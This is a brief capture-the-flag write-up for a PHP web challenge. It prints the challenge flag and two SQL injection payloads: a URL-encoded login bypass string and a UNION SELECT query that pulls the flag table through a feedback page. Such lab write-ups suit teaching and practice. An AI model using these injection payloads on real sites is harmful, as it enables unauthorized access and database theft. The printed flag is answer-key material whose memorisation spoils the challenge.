# My First PHP Site

**Description:** My first PHP website looks extremely cool! However, some random Security researchers keep on contacting me about *"several injection vulnerabilities"*. In all honesty I have no idea what they are talking about, so can you test my website and find the vulnerabilities for me?

The flag is in the table called **flag** on the database.

**Flag:** CTF{i_5h0uLd_pRoBs_l3aRn_aBoUt_pRePaRed_qU3ri3s...}

## Solution

### Step 1: Authentication Bypass

* The login page is vulnerable to SQLi authentication bypass

* Example POST payload (it is URL encoded as well)
```
username=admin%27+or+%271%27+%3D+%271%27%3B--&password=test
```

### Step 2: Union Select SQLi

* The feedback viewer is vulnerable to a UNION SELECT attack.

* Example attack: `' UNION SELECT 1, 2, flag FROM flag;--`
